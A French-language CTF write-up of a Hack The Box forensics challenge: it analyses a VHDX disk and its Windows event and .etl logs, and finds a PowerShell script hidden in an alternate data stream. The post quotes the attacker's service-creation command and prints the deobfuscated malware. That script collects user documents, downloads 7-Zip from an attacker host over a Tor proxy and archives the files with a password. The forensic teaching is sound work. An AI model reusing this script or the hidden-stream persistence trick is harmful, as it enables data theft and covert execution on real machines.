---
title: "[HTB CTF CYBER APO 2023] Forensic Windows : Artifact of dangerous sightings.
  Ou comment monter en compétence en ne résolvant rien."
categories:
- CTF
- Forensics
image:
  path: htb_cyber_apo_front_image.png
  alt: htb cyberapocalypse 2023
img_path: "/assets/img/posts/2023-03-27-htb-cyber-apo-2023-forensic-windows-artifact-of-dangerous-sightings-ou-comment-monter-en-competence-en-ne-reussissant-rien"
tags:
- ctf
- windows
- forensics
- htb
- cyberapocalyspe2023
- vhdx
- alternate_data_stream
- powershell
---

### Introduction

> Le CTF Hack The Box Cyber Apocalypse 2023 s'est déroulé au milieu de ce mois de Mars avec plus de 6000 équipes participantes, constituées pour nombre d'entre elles d'expert.e.s en cybersécurité. Notre équipe d'étudiant.e.s de 42 (spécifiquement de l'asso APT 42) a terminé quant à elle à une excellente 71ème place !

> Pour ma part, après quelques déconvenues liées à l'infrastructure sur les challenges web, je me suis lancé dans les challenges _forensic_, que j'apprécie particulièrement pour leur diversité et les sujets brossés. Il s'agit de mon second "vrai" ctf (après le HTB Uni CTF de décembre 2022), en cela que j'y ai participé pleinement.

> Challenge _forensic_ ? Il s'agit en général de trouver un _flag_ dans une capture de mémoire vive, dans un disque (vhd, vhdx, img etc.), dans une capture réseau (pcap), une clé usb... à l'aide d'outils nous permettant d'analyser ces différents éléments. Si la difficulté d'un challenge est plus élevée, il y aura fort à parier qu'il faudra faire appel à d'autres compétences : cryptographie, rétro-ingéniérie, osint... En bref, une catégorie très complète, vraiment intéressante à jouer !
{: .prompt-info }

Ceci étant posé, intéressons-nous à notre sujet : Artifact of Dangerous Sightings, un challenge classé comme medium.
### Montage du disque VHDX

Le matériau auquel nous avons accès est un disque dur virtuel VHDX, un format pour windows. C'est un format un peu particulier, qui malheureusement pose certains problèmes à l'analyse avec un logiciel comme [Autopsy](https://www.autopsy.com/). En effet, ce dernier ne reconnaît pas le format du disque pour une raison inconnue.

Quoiqu'il en soit, Autopsy n'aurait pas forcément été d'une grande aide. Un disque VHDX peut très simplement se monter sur un système Windows via le gestionnaire de disque. On peut également monter le disque sur un système de type \*nix via qemu. Le disque apparaîtra comme une nouvel élément de l'ordinateur, à l'image de ce qu'on peut avoir pour les machines virtuelles.

![vhdx gestionnaire de disque windows](vhdx.PNG)
_Le vhdx monté via le gestionnaire de disque_

### Analyse du disque

#### Les événements windows

Une fois l'étape du montage faite, reste à analyser ce que contient le disque. Nous avons accès au dossier C en partie, et quelques sous dossiers classiques (System 32, Program Data, users...) en partie également.

L'ensemble de ce qui a été copié après l'infection est disponible sous forme de CSV.

![le csv avec les fichiers copiés](csv.PNG)

Pour un challenge Forensic windows, l'une des premières choses intéressante à faire est de checker les événements Windows. Ce sont des fichiers catégorisés, qui listent différents événements après souscription d'un programme processus etc. à un type d'événement particulier.

Pour le cas d'une infection, les catégories qui vont le plus nous intéresser sont celles de type "Système", "Sécurité", ainsi que tout ce qui est lié au powershell (par exemple les lignes de commande qui ont été effectuées). Le problème principal pour ce challenge réside dans le fait que les événements les plus intéressants ont été effacés : en effet, nous avons pu retrouver trace de la commande coupable de ces délétions de toutes les catégories liées à powershell.

Reste des traces de l'attaquant. Dans différentes catégories (notamment Système et Sécurité), on peut subodorer ce qu'il s'est passé :

- Un nouveau service a été créé via la ligne de commande. On peut en voir une trace ci-dessous :

![ligne de commande très suspecte](evtx_suspect_nom_du_script.PNG)

La ligne de commande exacte est `sc create WindowssTask binPath="\"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\" -ep bypass - < C:\Windows\tasks\ActiveSyncProvider.dll:hidden.ps1 <snip>"`.

L'idée est simple : l'attaquant a créé un nouveau service Windows avec des moustaches -  WindowssTask - et a utilisé un script "hidden.ps1" probablement dangereux afin d'arriver à ses fins (on verra plus tard que l'histoire est un peu plus complexe que cela).

- On retrouve trace de ce service un peu partout. Muni du nom du service "WindowssTask", on peut rechercher au sein des événements ses apparations. Par exemple ici :

![Une nouvelle trace du service](evtx_suspect.PNG)

Notons que nous avons pu également découvrir que - sans grande surprise - le service n'a jamais fonctionné (il en aurait été probablement autre chose dans un cas _IRL_).

Notons également que le fichier hidden.ps1 a été créé via un équivalent de la commande`echo`, que ce fichier se nomme "finpayload", et qu'il était placé dans le dossier "Temp". On peut trouver toutes informations via les événements windows et à divers autres endroits.

### A la recherche du script perdu

#### Du côté de chez Skill Issue

  Nous avons une cible : hidden.ps1. Un nom de service : WindowssTask. Que peut-il se passer de mal ? Eh bien à peu près tout. Il y eu ce qu'on appelle une _skill issue_ : l'impossibilité de résoudre un challenge par manque de connaissance d'une, et de recherches infructueuses, de deux. Et pourtant, en 15h/20h sur ce challenge, il y aeu de nombreuses tentatives pour résoudre ce challenge.

  Faisons une liste de ce qui a été essayé. De cette liste tire le titre de cet article, car à essayer énormément de choses, on en apprend également énormément lorsqu'on fait face à un problème qui nous semble insoluble :

- [x] Try Hard (non chronologique)
  + [x] Rechercher le fichier dans le disque (évident mais inutile !)
  + [x] Utiliser bstrings de E. Zimmermann (qui a été un compagnon de route tout le long de cette épreuve)
  + [x] Parser les fichiers [Pretech](https://www.malekal.com/quest-ce-que-prefetch-sur-windows-et-comment-activer-ou-desactiver-prefetch/)
  + [x] Checker le fichier [Amcache](https://andreafortuna.org/2017/10/16/amcache-and-shimcache-in-forensic-analysis/)
  + [x] Analyser le cache Edge
  + [x] Ouvrir les fichiers du dossier Task un à un
  + [x] Tenter de dump le fichier "finpayload" à l'aide de volatility.
  + [x] Analyser, parser et tenter de dumper le fichier "finpayload" à partir de la table [$MFT](https://learn.microsoft.com/fr-fr/windows/win32/fileio/master-file-table)
  + [x] Ouvrir toutes les bases de données sqlite du disque
  + [x] Ouvrir tous les event windows (et par la même apprendre masse de choses dessus)
  + [x] Tenter de dump le registre (il a été effacé)
  + [x] Tenter de réparer ou recouvrer les fichiers effacés du disque (inutile)
  + [x] Faire de la rétro-ingéniérie sur ActiveSync.dll (spoil, c'est un fichier Windows)
  + [x] Passer au peigne d'un éditeur hexadécimal les fichiers non lisibles par un programme d'analyse forensique
  + [x] Checker les bases de données des thumbnails
  + [x] Analyser les fichiers .lnk
  + [x] Utiliser Kape pour refaire tout ce qui a été fait ci-dessus (le résultat est plus foutraque ceci dit)
  + [x] Tout un tas d'autres choses dont je ne me souviens plus.

Si cela a été infructueux, nous aurons pu mettre la main sur l'intégralité de l'existence de l'infection sur le système, notamment via les fichiers .etl.

#### A l'ombre des fichiers .etl

> Les fichier .etl pour "Event Trace Log" sont des fichiers qui ressemblent à des bases de données, classifiés en différentes catégories (comme les event windows) et sont ce qui semble être la matière brute des events windows ou bien leur reliquat.
{: .prompt-info }

Via ces logs, nous sommes en mesure de choper des informations extrêmement intéressantes vis à vis de différents processus. Les deux catégories qui sont absolument à analyser sont celles qui concernent le _boot_ du système et l'extinction du système. Concernant le boot, nous serons en mesure d'analyser tous les processus au démarrage de windows, y compris l'imbrication des processus entre eux et une sorte de visualisation de la stack.

Concernant l'extinction, c'est la même chose, mais lorsque le système s'éteint.

![Le fichier etl concernant le boot](etl_exemple.PNG)


Voir cette excellente vidéo concernant les fichiers etl :

{% include embed/youtube.html id='TUR-L9AtzQE' %}

> On peut ouvrir analyser les fichiers .etl grâce au programme Windows [PerfView](https://github.com/Microsoft/perfview/releases)
{: .prompt-info }


Concernant notre cas, il s'est avéré que seuls les processus au démarrage de windows étaient intéressants. En recherchant au sein des différents logs, on peut retrouver énormément de preuves de l'infection, et même retracer son exécution et le contexte de son exécution. De plus, les fichiers etl, comme évoqué plus haut, permettent d'avoir une sorte de stack des processus, en partant d'un processus "père" appelant, avec tous les sous processus créés par le processus principal.

![La stack concernant hidden.ps1](stack_processus_suspect.PNG)
_On peut très clairement voir ici  que c'est le programme service.exe qui lance le script hidden.ps1. Cependant, on le savait déjà via les events windows. L'intérêt est surtout de retracer la chronologie, et potentiellement trouver d'autres preuves de l'infection, trouver d'autres endroits où chercher le script._

#### Conclusion partielle

Cette première étape d'analyse, qui fut très longue, a été l'occasion d'apprendre de très nombreuses choses concernant les systèmes windows et leur analyse. Que ce soit sur le nombre phénoménal d'informations dispatchées à divers endroits et les façons de les analyser, ou la possibilité de retracer précisément les étapes d'une infection, le voyage n'aura pas été vain et confirme que les CTF sont des formidables terrains d'apprentissage. Cela aura permis en outre de découvrir de très nombreux programmes, [notamment ceux d'Eric Zimmerman](https://ericzimmerman.github.io/#!index.md). Outre ces logiciels, citons également le site [hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/windows-forensics), qui propose de façon succinte des pistes pour l'analyse forensique d'un système windows (même s'il semble y avoir quelques lacunes, notamment concernant les fichiers etl).

### Résolution Post-Partum

Ce riche échec ne pouvait pas se terminer par l'ignorance de la résolution du challenge. Une fois le CTF terminé, un des participants a indiqué pourquoi hidden.ps1 portait bien son nom.

Il s'agit en fait d'un [Alternate Data Stream](https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams). Ce sont des fichiers qui sont adossés à un autre fichier, mais qui ne contiennent que des données dans la sections $Data (section qu'on peut croiser via la $MFT). En somme, ce sont des $Data sans l'attribut de nom, et sont dès lors introuvables directement via une simple recherche, au contraire d'un fichier classique. Nous concernant, hidden.ps1 est adossé au fichier ActiveSync.dll, via la nomenclature `fichier:ads`, "fichier" pouvant être vide et `ads` étant l'alternate data stream. Le site Malekal propose une présentation des _alternate data stream_ : [voir ici](https://www.malekal.com/ads-windows-alternate-data-streams/).

Mais même si on ne peut pas chercher le fichier comme un fichier classique, on peut tout de même - et heureusement, sinon quel est l'intérêt - lire son contenu.

#### ... le contenu en question.

La commande windows pour lire le contenu d'un ads est `Get-Content`:

![Le contenu du script hidden.ps1](contenu_du_script.PNG)
_Si simple..._

C'est un vrai bordel. On voit qu'il y a une ligne de commande exécutée, avec la stratégie d'exécution en mode "bypass", et une **énorme** suite de lettres.

On remarque très rapidement qu'il s'agit de base64, et on s'empresse donc de le décoder via cyberchef :

![fichier décodé du base64](script_from_b64.PNG)
_ouch._

Le fichier est obfusqué. Cela peut paraître démotivant de prime abord, mais quelques Write-Output placés après les variables nous permettent de trouver que les premières sont égales à des nombres, via des opérations de magie noire (aka je n'ai pas compris comment on passe de cette suite de caractère au chiffre "1") :

```powershell
${[~@} = $();
${!!@!!]} = ++${[~@};#1
${[[!} = --${[~@} + ${!!@!!]} + ${!!@!!]};#2
${~~~]} = ${[[!} + ${!!@!!]};#3
${[!![!} = ${[[!} + ${[[!};#4
${(~(!} = ${~~~]} + ${[[!};#5
${!~!))} = ${[!![!} + ${[[!};#6
${((!} = ${!!@!!]} + ${[!![!} + ${[[!};#7
${=!!@!!}  = ${~~~]} - ${!!@!!]} + ${!~!))};#8
${!=} =  ${((!} - ${~~~]} + ${!~!))} - ${!!@!!]};#9
${=@!~!} = "".("$(@{})"[14]+"$(@{})"[16]+"$(@{})"[21]+"$(@{})"[27]+"$?"[1]+"$(@{})"[3]);#String Insert(int startIndex, String charValue)
${=@!~!} = "$(@{})"[14]+"$?"[3]+"${=@!~!}"[27]; ${@!=} = "["+"$(@{})"[7]+"$(@{})"[22]+"$(@{})"[20]+"$?"[1]+"]";#iex
${@!=} = "["+"$(@{})"[7]+"$(@{})"[22]+"$(@{})"[20]+"$?"[1]+"]";#[Char]
```

Ainsi `++${[~@}` donne le chiffre 1 et l'addition de la variable `${!!@!!]}` (égale à 1) donne le chiffre 2 et ainsi de suite... jusqu'à 9.

On remarque ensuite que le même type d'opération est exécuté pour ce qui semble être la signature d'une fonction qui retourne une String et, pour cette même variable, la commande `iex`qui est l'abréviation de `Invoke-Expression`.

`${@!=}`donne quant à elle le mot `[Char]`, qui nous donne un indice sur la façon dont est construit le code malveillant.


Le reste est le _payload_ en tant que tel, à savoir une suite de chiffres suivant le mot clé `[Char]`, le tout se terminant par soit `iex` soit `String Insert(int startIndex, String charValue)`.

Si on tente d'éxécuter (sur vm) le code, l'éxécution s'arrête. Ceci est contournable en enlevant l'appel de fin à une des deux fonctions `iex` ou `insert` ainsi que tous les `$()`(peut-être est-il possible de faire autrement, mais c'est lacunaire).

```powershell
<snip>
 | ${=@!~!}" |& ${=@!~!}# ce sont les deux variables qui font références soit à iex, soit à Insert.
 ```

Pour terminer, rien de plus simple à faire : on peut simplement afficher les lignes de code décodées sans les exécuter et ainsi trouver l'ensemble du fichier :

![Etape de déobfuscation finale](script_deobfusqué.PNG)

Et voici le résultat final :

```powershell
### .     .       .  .   . .   .   . .    +  .
###   .     .  :     .    .. :. .___---------___.
###        .  .   .    .  :.:. _".^ .^ ^.  '.. :"-_. .
###     .  :       .  .  .:../:            . .^  :.:\.
###         .   . :: +. :.:/: .   .    .        . . .:\
###  .  :    .     . _ :::/:                         .:\
###   .. . .   . - : :.:./.                           .:\
###  .   .     : . : .:.|. ######               #######::|
###   :.. .  :-  : .:  ::|.#######             ########:|
###  .  .  .  ..  .  .. :\ ########           ######## :/
###   .        .+ :: : -.:\ ########         ########.:/
###     .  .+   . . . . :.:\. #######       #######..:/
###       :: . . . . ::.:..:.\                   ..:/
###    .   .   .  .. :  -::::.\.       | |       .:/
###       .  :  .  .  .-:.":.::.\               .:/
###  .      -.   . . . .: .:::.:.\            .:/
### .   .   .  :      : ....::_:..:\   ___   :/
###    .   .  .   .:. .. .  .: :.:.:\       :/
###      +   .   .   : . ::. :.:. .:.|\  .:/|
### SCRIPT TO DELAY HUMAN RESEARCH ON RELIC RECLAMATION
### STAY QUIET - HACK THE HUMANS - STEAL THEIR SECRETS - FIND THE RELIC
### GO ALLIENS ALLIANCE !!!
function makePass
{
    $alph=@();
    65..90|foreach-object{$alph+=[char]$_};
    $num=@();
    48..57|foreach-object{$num+=[char]$_};

    $res = $num + $alph | Sort-Object {Get-Random};
    $res = $res -join '';
    return $res;
}

function makeFileList
{
    $files = cmd /c where /r $env:USERPROFILE *.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php;
    $List = $files -split '\r';
    return $List;
}

function compress($Pass)
{
    $tmp = $env:TEMP;
    $s = 'https://relic-reclamation-anonymous.alien:1337/prog/';
    $link_7zdll = $s + '7z.dll';
    $link_7zexe = $s + '7z.exe';

    $7zdll = '"'+$tmp+'\7z.dll"';
    $7zexe = '"'+$tmp+'\7z.exe"';
    cmd /c curl -s -x socks5h://localhost:9050 $link_7zdll -o $7zdll;
    cmd /c curl -s -x socks5h://localhost:9050 $link_7zexe -o $7zexe;

    $argExtensions = '*.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php';

    $argOut = 'Desktop\AllYourRelikResearchHahaha_{0}.zip' -f (Get-Random -Minimum 100000 -Maximum 200000).ToString();
    $argPass = '-p' + $Pass;

    Start-Process -WindowStyle Hidden -Wait -FilePath $tmp'\7z.exe' -ArgumentList 'a', $argOut, '-r', $argExtensions, $argPass -ErrorAction Stop;
}

$Pass = makePass;
$fileList = @(makeFileList);
$fileResult = makeFileListTable $fileList;
compress $Pass;
$TopSecretCodeToDisableScript = "HTB{Y0U_C4nt_St0p_Th3_Alli4nc3}"
```

### Conclusion

Un challenge très intéressant qui aura permis d'apprendre de nombreuses nouvelles choses, impossible à lister exhaustivement ici. La résolution post CTF ce sera avérée relativement simple une fois qu'on connaît les Alternate Data Stream et leur fonctionnement.
